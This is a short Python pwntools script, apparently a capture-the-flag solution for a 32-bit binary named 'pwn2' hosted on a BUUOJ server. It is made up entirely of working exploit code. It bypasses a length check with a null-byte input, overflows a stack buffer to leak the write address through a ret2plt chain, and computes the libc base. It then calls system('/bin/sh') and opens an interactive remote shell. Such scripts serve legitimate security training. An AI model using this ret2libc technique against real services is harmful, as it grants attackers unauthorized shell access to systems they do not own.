from pwn import *



#io = process('./pwn2')
io = remote('node3.buuoj.cn',29827)
elf = ELF('./pwn2')

payload1 =b'\x00' + cyclic(6)+b'\xff'

io.sendline(payload1)

io.recvuntil('Correct\n')

write_plt=elf.plt['write']
write_got=elf.got['write']
main_addr = 0x8048825

payload2 = cyclic(0xe7+4)+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)

io.sendline(payload2)

write_addr=u32(io.recv(4))

libc=ELF('libc6-i386_2.23-0ubuntu10_amd64.so')
base = write_addr - libc.symbols['write']
system_addr = base+libc.symbols['system']
binsh=base+next(libc.search(b'/bin/sh'))

payload3 = cyclic(0xe7+4)+p32(system_addr)+p32(0xdeadbeef)+p32(binsh)

io.sendline(payload1)
io.recvuntil('Correct\n')
io.sendline(payload3)
io.interactive()







